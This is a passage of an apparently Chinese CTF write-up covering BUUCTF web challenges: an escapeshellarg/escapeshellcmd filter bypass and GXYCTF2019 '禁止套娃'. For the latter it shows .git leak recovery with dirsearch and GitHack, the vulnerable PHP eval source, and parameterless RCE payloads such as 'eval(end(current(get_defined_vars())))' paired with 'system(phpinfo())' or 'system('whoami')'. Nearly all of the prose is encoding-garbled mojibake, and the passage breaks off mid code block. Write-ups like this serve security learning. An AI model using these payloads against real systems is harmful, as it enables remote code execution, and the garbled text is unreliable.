åœ°å€çš„æ‰«ææ—¶é—´(å•ä½ä¸ºç§’).-Fï¼šè¦æ±‚æ‰«ææ—¶(åŒ…æŒºpingæ‰«æ)ä½¿ç”¨å°çš„IPåŒ…åˆ†æ®µã€‚</span><br></code></pre></td></tr></table></figure><p>çœ‹äº†å…¶å®ƒå¸ˆå‚…ä»¬çš„wpï¼Œé—®é¢˜ä¸»è¦å‡ºåœ¨è¿ç»­ä½¿ç”¨<code>escapeshellarg</code> å’Œ <code>escapeshellcmd</code>ä¸Šï¼šåŒæ—¶ä½¿ç”¨ä¼šå¯¼è‡´ç»•è¿‡è¿‡æ»¤æ‰§è¡Œå‘½ä»¤ï¼š</p><p>ä»¥ä¸‹å†…å®¹å‚è€ƒäº†X1r0zå¸ˆå‚…çš„åšå®¢ï¼š</p><p><code>https://exp10it.cn/2022/08/buuctf-web-writeup-3/#buuctf-2018online-tool</code></p><blockquote><p>escapeshellarg() ä¼šåœ¨å•å¼•å·ä¹‹å‰åŠ ä¸Š <code>\</code>, å¹¶åœ¨è¢«è½¬ä¹‰çš„å•å¼•å·ä¸¤è¾¹å’Œæ•´ä¸ªå­—ç¬¦ä¸²ä¸¤è¾¹åŠ ä¸Šå•å¼•å·</p><p>escapeshellcmd() ä¼šåœ¨æ‰€æœ‰çš„ <code>\</code> å‰åŠ ä¸Š <code>\</code>, å½¢æˆ <code>\\</code>, å¹¶åœ¨<strong>ä¸æˆå¯¹</strong>çš„å•å¼•å·å‰åŠ  <code>\</code></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">123</span> -&gt; <span class="hljs-string">&#x27;123&#x27;</span> -&gt; <span class="hljs-string">&#x27;123&#x27;</span> <span class="hljs-comment"># æ­£å¸¸æ•ˆæœ</span><br>    <br><span class="hljs-number">123</span><span class="hljs-string">&#x27; -&gt; &#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;\&#x27;&#x27;</span><span class="hljs-string">&#x27; -&gt; &#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;\\&#x27;</span><span class="hljs-string">&#x27;\&#x27; # æœ€åä¸€ä¸ªå¼•å·ä¸æˆå¯¹, è¢«è½¬ä¹‰</span><br><span class="hljs-string"></span><br><span class="hljs-string">123&#x27;</span><span class="hljs-string">&#x27; -&gt; &#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;\&#x27;&#x27;</span><span class="hljs-string">&#x27;\&#x27;&#x27;</span><span class="hljs-string">&#x27; -&gt; &#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;\\&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27; # æ‰€æœ‰å¼•å·æˆå¯¹, ä¸è½¬ä¹‰</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27; -&gt; &#x27;</span><span class="hljs-string">&#x27;\&#x27;&#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;\&#x27;&#x27;</span><span class="hljs-string">&#x27; -&gt; &#x27;</span><span class="hljs-string">&#x27;\\&#x27;</span><span class="hljs-string">&#x27;123&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27; # æ‰€æœ‰å¼•å·æˆå¯¹, ä¸è½¬ä¹‰</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://blog.csdn.net/weixin_43952190/article/details/<span class="hljs-number">105846175</span><br><br><span class="hljs-attribute">https</span>://blog.csdn.net/shinygod/article/details/<span class="hljs-number">123207785</span>?utm_medium=distribute.pc_relevant.none-task-blog-<span class="hljs-number">2</span>~default~baidujs_baidulandingword~default-<span class="hljs-number">0</span>-<span class="hljs-number">123207785</span>-blog-<span class="hljs-number">105846175</span>.<span class="hljs-number">235</span>^v38^pc_relevant_yljh&amp;spm=<span class="hljs-number">1001</span>.<span class="hljs-number">2101</span>.<span class="hljs-number">3001</span>.<span class="hljs-number">4242</span>.<span class="hljs-number">1</span>&amp;utm_relevant_index=<span class="hljs-number">3</span><br><br><span class="hljs-attribute">https</span>://exp10it.cn/<span class="hljs-number">2022</span>/<span class="hljs-number">08</span>/buuctf-web-writeup-<span class="hljs-number">3</span>/#buuctf-<span class="hljs-number">2018</span>online-tool<br><br><span class="hljs-attribute">https</span>://blog.csdn.net/xhy18634297976/article/details/<span class="hljs-number">122852540</span>?spm=<span class="hljs-number">1001</span>.<span class="hljs-number">2101</span>.<span class="hljs-number">3001</span>.<span class="hljs-number">6650</span>.<span class="hljs-number">1</span>&amp;utm_medium=distribute.pc_relevant.none-task-blog-<span class="hljs-number">2</span>%<span class="hljs-number">7</span>Edefault%<span class="hljs-number">7</span>ECTRLIST%<span class="hljs-number">7</span>ERate-<span class="hljs-number">1</span>-<span class="hljs-number">122852540</span>-blog-<span class="hljs-number">100711933</span>.<span class="hljs-number">235</span>%<span class="hljs-number">5</span>Ev38%<span class="hljs-number">5</span>Epc_relevant_yljh&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-<span class="hljs-number">2</span>%<span class="hljs-number">7</span>Edefault%<span class="hljs-number">7</span>ECTRLIST%<span class="hljs-number">7</span>ERate-<span class="hljs-number">1</span>-<span class="hljs-number">122852540</span>-blog-<span class="hljs-number">100711933</span>.<span class="hljs-number">235</span>%<span class="hljs-number">5</span>Ev38%<span class="hljs-number">5</span>Epc_relevant_yljh&amp;utm_relevant_index=<span class="hljs-number">2</span><br><br><span class="hljs-attribute">https</span>://blog.csdn.net/weixin_44077544/article/details/<span class="hljs-number">102835099</span><br><br><span class="hljs-attribute">https</span>://blog.csdn.net/xhy18634297976/article/details/<span class="hljs-number">122852540</span>?spm=<span class="hljs-number">1001</span>.<span class="hljs-number">2101</span>.<span class="hljs-number">3001</span>.<span class="hljs-number">6650</span>.<span class="hljs-number">1</span>&amp;utm_medium=distribute.pc_relevant.none-task-blog-<span class="hljs-number">2</span>%<span class="hljs-number">7</span>Edefault%<span class="hljs-number">7</span>ECTRLIST%<span class="hljs-number">7</span>ERate-<span class="hljs-number">1</span>-<span class="hljs-number">122852540</span>-blog-<span class="hljs-number">100711933</span>.<span class="hljs-number">235</span>%<span class="hljs-number">5</span>Ev38%<span class="hljs-number">5</span>Epc_relevant_yljh&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-<span class="hljs-number">2</span>%<span class="hljs-number">7</span>Edefault%<span class="hljs-number">7</span>ECTRLIST%<span class="hljs-number">7</span>ERate-<span class="hljs-number">1</span>-<span class="hljs-number">122852540</span>-blog-<span class="hljs-number">100711933</span>.<span class="hljs-number">235</span>%<span class="hljs-number">5</span>Ev38%<span class="hljs-number">5</span>Epc_relevant_yljh&amp;utm_relevant_index=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><h2 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h2><p><img src="/img/tw1.png" alt="tw1"></p><p>æºç æ²¡å•¥ä¿¡æ¯ï¼Œç›´æ¥dirsearchæ‰«çœ‹çœ‹å§ï¼š</p><p><code>python dirsearch.py -u http://8126df41-22c6-4533-823d-8e6fc9622f9d.node4.buuoj.cn --delay 3 -t 30</code></p><p><img src="/img/tw2.png" alt="tw2"></p><p>æ‰«å‡ºæ¥å¾ˆå¤š.gitæ–‡ä»¶ã€‚ã€‚åº”è¯¥æ˜¯gitæ³„éœ²äº†ï¼Œç”¨GitHackå¼„å®ƒï¼š</p><p><code>python GitHack.py -u http://8126df41-22c6-4533-823d-8e6fc9622f9d.node4.buuoj.cn/.git/</code></p><p><img src="/img/tw3.png" alt="tw3"></p><p>ç°åœ¨windowsä¸‹çœ‹çœ‹ï¼Œä¸è¡Œå†ç”¨Kaliåšã€‚å‘ç°æœ‰ä¸ªIndex.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<span class="hljs-comment">//æ­£åˆ™åŒ¹é…ï¼Œè¿‡æ»¤äº†ç‚¹ä¼ªåè®®è¦ç”¨çš„ä¸œè¥¿(æ¯”å¦‚data://å•¥çš„ï¼Œå‰é¢åŠ é‚£ä¸ª\æ˜¯è½¬ä¹‰ç”¨çš„)ï¼Œæ²¡è§¦å‘åˆ™è¿›è¡Œä¸‹ä¸€æ­¥åˆ¤æ–­ã€‚/iæ¨¡å¼ä¸åŒºåˆ†å¤§å°å†™</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<span class="hljs-comment">//åŒ¹é…a-zï¼Œé€—å·å’Œ_ï¼Œ\(å’Œ\)åˆ†åˆ«æ˜¯è½¬ä¹‰åçš„å·¦æ‹¬å·å’Œå³æ‹¬å·ã€‚(?R)?è¿™ç©æ„å„¿æŸ¥äº†ä¸€ä¸‹è¯´æ˜¯é€’å½’æ¨¡å¼?æ­£åˆ™è¿‡æ»¤åçš„ç»“æœå¿…é¡»å¼ºç­‰äºåˆ†å·</span><br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<span class="hljs-comment">//åˆä¸€æ¬¡è¿‡æ»¤äº†ä¸€å¤§å †ä¸œè¥¿                // echo $_GET[&#x27;exp&#x27;];</span><br>                @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs PHP">æ­£åˆ™åŒ¹é…ä¸­(?R)?é€’å½’æ¨¡å¼çš„è§£é‡Šï¼š<br>    ?Ræ˜¯å¼•ç”¨å½“å‰è¡¨è¾¾å¼((/[a-z,_]+((?R)?)/))ï¼Œå½¢æˆé€’å½’è°ƒç”¨ã€‚<br>    ?è¡¨ç¤ºé€’å½’å½“å‰è¡¨è¾¾å¼<span class="hljs-number">0</span>æ¬¡æˆ–<span class="hljs-number">1</span>æ¬¡ã€‚è‹¥æ˜¯(?R)*åˆ™è¡¨ç¤ºé€’å½’å½“å‰è¡¨è¾¾å¼<span class="hljs-number">0</span>æ¬¡æˆ–å¤šæ¬¡ï¼Œä¾‹å¦‚å®ƒå¯ä»¥åŒ¹é…<span class="hljs-title function_ invoke__">a</span>(<span class="hljs-title function_ invoke__">b</span>(<span class="hljs-title function_ invoke__">c</span>()<span class="hljs-title function_ invoke__">d</span>()))ï¼Œä¸¾ä¸ªæ —å­ï¼š<br>    <br>    <br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;a(b(c(d()f()e())));&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$a</span>)) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;goodbye&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span>   <span class="hljs-comment">//echo  hello</span><br> <br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;a(b(c(d()f()e())));&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)*\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$a</span>)) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;goodbye&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><span class="hljs-comment">//echo  goodbye</span><br><br><span class="hljs-comment">//æ³¨æ„$açš„æ ¼å¼ï¼Œå¦‚æœæ˜¯å¾ˆæ ‡å‡†çš„ä¸€ä¸ªæ‹¬å·å¥—ç€ä¸€ä¸ªæ‹¬å·ï¼ša(b(c()))ï¼Œok,ç”¨è¿™ä¸¤ç§éƒ½æ²¡é—®é¢˜ï¼Œä½†ä½ å¦‚æœæœ‰çš„åœ°æ–¹å¥—äº†ä¸¤ä¸ªï¼ša(b()c())ã€‚é‚£ç¬¬ä¸€ç§å°±ä¸è¡Œäº†ï¼Œåªèƒ½ç”¨ç¬¬äºŒç§ã€‚æˆ‘ä¸ªäººç†è§£å°±æ˜¯?ä¸€ä¸ªå¥—ç€ä¸€ä¸ªè¿™æ ·æï¼Œä½†æ˜¯*å…è®¸ä¸€ä¸ªå¥—å¤šä¸ªã€‚æ„Ÿè§‰è¿™å°±æ˜¯é¢˜ç›®è¯´çš„å¥—å¨ƒï¼Ÿä¸€èˆ¬RCEéƒ½è¦ç»™æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°ä¼ å‚ï¼Œæ¯”å¦‚eval(system(&#x27;ls&#x27;));ã€‚åŒ¹é…å®Œäº†ä¼šå¤šä¸ª&#x27;&#x27;å‡ºæ¥ã€‚</span><br>    <br></code></pre></td></tr></table></figure><p>ç»è¿‡è¿™ç§æ­£åˆ™åŒ¹é…åèƒ½è¿‡æ»¤çš„åŸºæœ¬éƒ½è¿‡æ»¤äº†ï¼Œå»ç½‘ä¸ŠæŸ¥äº†wpåŸæ¥è¿™æ˜¯ä¸€ç§å«<code>æ— å‚æ•°RCE</code>çš„é¢˜å‹(ç¬¬ä¸€æ¬¡è§)ã€‚ä¸‹é¢çš„å†…å®¹å‚è€ƒäº†è¿™ä¸¤ä½å¸ˆå‚…çš„æ–‡ç« ï¼Œæ„Ÿè°¢!</p><p><code>https://blog.csdn.net/Manuffer/article/details/120738755</code></p><p><code>https://blog.csdn.net/weixin_46330722</code></p><p>æ— å‚æ•°RCEä¸€èˆ¬æœ‰ä¸‰ç§è§£æ³•ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>.åˆ©ç”¨<span class="hljs-built_in">getallheaders</span>()å‡½æ•°ã€‚<br><span class="hljs-number">2</span>.åˆ©ç”¨<span class="hljs-built_in">get_defined_vars</span>()å‡½æ•°ã€‚<br><span class="hljs-number">3</span>.åˆ©ç”¨session_idå¸®åŠ©å‘½ä»¤æ‰§è¡Œã€‚<br></code></pre></td></tr></table></figure><p>æ‹¿<code>getallheaders()</code>æ¥è¯´ï¼Œè¿™ä¸œè¥¿ä¼šä»¥æ•°ç»„å½¢å¼è¿”å›æ‰€æœ‰HTTPå¤´ä¿¡æ¯ï¼Œä¸¾ä¸ªæ —å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">getallheaders</span>());<span class="hljs-comment">//æ•°ç»„å½¢å¼æ‰€ä»¥æˆ‘ç”¨äº†var_dump</span><br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç»“æœï¼š</p><p><img src="/img/tw4.png" alt="tw4"></p><p>å¯ä»¥çœ‹åˆ°ä»¥æ•°ç»„çš„å½¢å¼è¿”å›äº†HTTPæ•°æ®åŒ…çš„å¤´å’Œå¯¹åº”ä¿¡æ¯ï¼Œæœ‰æ„æ€çš„ä¸€ç‚¹æ˜¯è¿™ä¸œè¥¿æ˜¯å€’ç€å‡ºæ¥çš„ã€‚</p><p>æ•°ç»„å½¢å¼è‚¯å®šæ²¡æ³•ç”¨ï¼Œæƒ³ç»™<code>eval</code>å•¥çš„ä¼ å‚è‚¯å®šè¦æ˜¯ä¸ªå­—ç¬¦ä¸²ã€‚å¯ä»¥åˆ©ç”¨<code>implode</code>å‡½æ•°æŠŠæ•°ç»„å˜æˆå­—ç¬¦ä¸²ï¼Œçœ‹ä¸‹GPTå¯¹è¿™ä¸ªå‡½æ•°çš„è§£é‡Šï¼š</p><p><img src="/img/tw5.png" alt="tw5"></p><p>ä¸è¿‡è¿™ä¸ª$glueå¹¶ä¸æ˜¯å¿…é¡»çš„ï¼Œé»˜è®¤æ²¡ä¸œè¥¿ç›´æ¥ä¸²èµ·æ¥ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-title function_ invoke__">getallheaders</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/tw6.png" alt="tw6"></p><p>ç°åœ¨å­—ç¬¦ä¸²ä¹Ÿå¾—åˆ°äº†ï¼Œæˆ‘ä¹ˆå¯ä»¥åœ¨ä¼ httpåŒ…çš„æ—¶å€™ç»™æ•°æ®åŒ…åº•ä¸‹åŠ ä¸ªå¤´æ¯”å¦‚ï¼š<code>renyi:system(&#39;whoami&#39;);//</code>è¾¾åˆ°æ‰§è¡Œä»»æ„å‘½ä»¤çš„ç›®çš„(åé¢è·Ÿç€æ³¨é‡Šç¬¦å·ï¼ŒæŠŠå…¶ä»–çš„æ³¨é‡Šæ‰äº†)ã€‚</p><p>ä¸è¿‡ç€è¿™ç§æ–¹æ³•æˆ‘æ²¡æˆåŠŸã€‚ã€‚ã€‚</p><p><code>get_defined_vars()</code>ï¼šè¿”å›æ‰€æœ‰å·²å®šä¹‰æ‰€ç»„æˆçš„æ•°ç»„ï¼Œä¸è¿‡è¿™ä¸ªå’Œ<code>getallheaders()</code>ä¸ä¸€æ ·ï¼Œå®ƒè¿”å›çš„æ˜¯å¤šç»´æ•°ç»„ï¼Œä¸¾ä¸ªæ —å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>());<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/tw7.png" alt="tw7"></p><p>å¯ä»¥çœ‹åˆ°è¿™ä¸œè¥¿ä¼šæŠŠGETä¼ å…¥çš„å‚æ•°æ˜¾ç¤ºåœ¨ç¬¬ä¸€ä½</p><p><img src="/img/tw8.png" alt="tw8"></p><p>GETä¼ å…¥çš„å‚æ•°å¯æ§ï¼Œé‚£æˆ‘ä»¬è‚¯å®šå¸Œæœ›åœ¨è¿™ä¸ªå¤šç»´æ•°ç»„ä¸­å–å‡ºæˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿ï¼šåˆ©ç”¨<code>current</code>å‡½æ•°ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">current</span><span class="hljs-params">()</span></span>å‡½æ•°å¯ä»¥è¿”å›æ•°ç»„ä¸­çš„å•å…ƒä¸”åˆå§‹æŒ‡é’ˆæŒ‡å‘æ•°ç»„çš„ç¬¬ä¸€ä¸ªå•å…ƒã€‚å› ä¸ºGETæ–¹å¼ä¼ å…¥çš„å‚æ•°å­˜åœ¨è¯¥äºŒç»´æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªä¸€ç»´æ•°ç»„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šæœè¿™ä¸ªå‡½æ•°å°†å…¶å–å‡ºæ¥<br></code></pre></td></tr></table></figure><p>ä¸¾ä¸ªæ —å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>()));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/tw9.png" alt="tw9"></p><p><img src="/img/tw10.png" alt="tw10"></p><p>ä¼ ä¸¤ä¸ªå‚æ•°ä¹Ÿå¯ä»¥â†‘</p><p>å‡å¦‚æˆ‘ä»¬è¦ä¼ å…¥çš„æ¶æ„ä»£ç æ”¾åœ¨GETåé¢(ä¼ çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºäº†ç»•è¿‡ä¸€äº›ç‰¹å®šå‚æ•°çš„æ£€æµ‹ï¼Œç¬¬äºŒä¸ªå‚æ•°æ”¾æ¶æ„ä»£ç )ï¼Œé‚£ä¹ˆå¦‚ä½•é€šè¿‡<code>current(get_defined_vars())</code>æŠŠä»–å–å‡ºæ¥ï¼Ÿ</p><p>å¯ä»¥åˆ©ç”¨<code>end</code>å‡½æ•°(è¿”å›æ•°ç»„æœ€åä¸€ä¸ªå•å…ƒçš„å€¼)ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>()));<br><br>?&gt;<br></code></pre></td></tr></table></figure><p><img src="/img/tw11.png" alt="tw11"></p><p>ç»•äº†ä¸ªå°å°çš„åœˆå­ï¼Œç°åœ¨å†™ä¸ªç®€å•çš„ä¸œè¥¿çœ‹çœ‹ä¸ºå•¥è¦é€šè¿‡ç¬¬äºŒç§æ–¹æ³•ä¼ ä¸¤ä¸ªå‚æ•°è¾¾åˆ°<code>RCE</code>çš„æ•ˆæœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123; <br>      <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br><br><br>&#125;<br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ„é€ payload:<code>?exp=eval(end(current(get_defined_vars())));&amp;c=system(phpinfo());</code></p><p><img src="/img/tw12.png" alt="tw12"></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸæ‰§è¡Œäº†<code>system(phpinfo())</code>ã€‚è§£é‡Šä¸‹ä¸ºä»€ä¹ˆè¿™ä¹ˆå†™ï¼š<code>eval(end(current(get_defined_vars())));</code>è¿™ä¸œè¥¿ä¸ºäº†è¿”å›æˆ‘ä»¬getä¼ è¿‡å»çš„æœ€åä¸€ä¸ªå‚æ•°çš„å€¼ã€‚æˆ‘ä¸€å¼€å§‹æ²¡åŠ evalæƒ³ç€å¤–é¢å·²ç»æœ‰ä¸ªevaläº†(å½“æ—¶äººæ™•äº†ï¼Œå“ˆå“ˆ)ï¼Œé‡Œé¢è¿™ä¸ªevalæ˜¯ä¸ºäº†æ‰§è¡Œè¿™äº›å¥—å¨ƒå‡½æ•°æŠŠæ¶æ„ä»£ç ç¿»å‡ºæ¥ï¼Œå¤–é¢çš„evalæ˜¯æ‰§è¡Œæ¶æ„ä»£ç ç”¨çš„ï¼Œä¸€æ¥ä¸€å›å°±ç›¸å½“äº<code>eval(system(phpinfo()))</code>äº†ã€‚è€Œä¸”è¿™ç¬¬äºŒä¸ªå‚æ•°å¯ä»¥éšä¾¿æ„é€ ï¼Œåæ­£å®ƒåªæ£€æµ‹<code>exp</code>ã€‚</p><p>ç¬¬ä¸‰ç§æ–¹æ³•é€šè¿‡<code>session_id</code>æ‰§è¡Œæ¶æ„ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span 